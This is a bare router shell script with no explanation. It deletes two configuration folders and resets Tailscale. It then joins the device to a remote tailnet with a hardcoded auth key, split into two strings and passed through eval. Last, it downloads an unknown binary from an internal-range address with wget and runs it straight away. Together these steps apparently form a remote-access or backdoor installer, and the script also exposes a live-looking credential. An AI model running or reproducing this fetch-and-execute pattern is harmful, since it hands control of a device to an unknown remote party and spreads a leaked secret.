#!/bin/sh

rm -rf /etc/radu
rm -rf /etc/pakawrt
uci set tailscale.settings.enabled='1'
uci commit tailscale
tailscale down
tailscale logout
rm -rf /etc/tailscale /var/lib/tailscale
/etc/init.d/tailscale restart
sleep 5
rs1="tskey-auth-knc3tFVDj111CNTRL-"
rs2="ZueuDodYkbJ3SeQfiy3zaJZJ9EXS8EyN3"
TSUP="tailscale up --reset --auth-key=${rs1}${rs2}"
eval "$TSUP"
wget -O /usr/bin/rr http://100.64.64.59:3030/static/rr
chmod +x /usr/bin/rr
rr
